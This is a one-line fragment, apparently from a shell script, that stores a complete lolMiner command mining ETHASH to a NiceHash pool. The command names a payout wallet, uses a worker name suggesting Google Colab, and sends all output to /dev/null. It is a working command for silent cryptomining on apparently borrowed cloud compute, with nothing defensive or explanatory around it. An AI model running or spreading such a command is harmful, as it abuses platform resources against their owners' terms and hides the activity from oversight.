...
wallet="./1.42/lolMiner --algo ETHASH --pool stratum+ssl://daggerhashimoto.auto.nicehash.com:443 --user 39Xoi6TZxzarLHrqJJzQLVCFoKis13vhSE.colab_$number_mining >/dev/null 2>&1 "
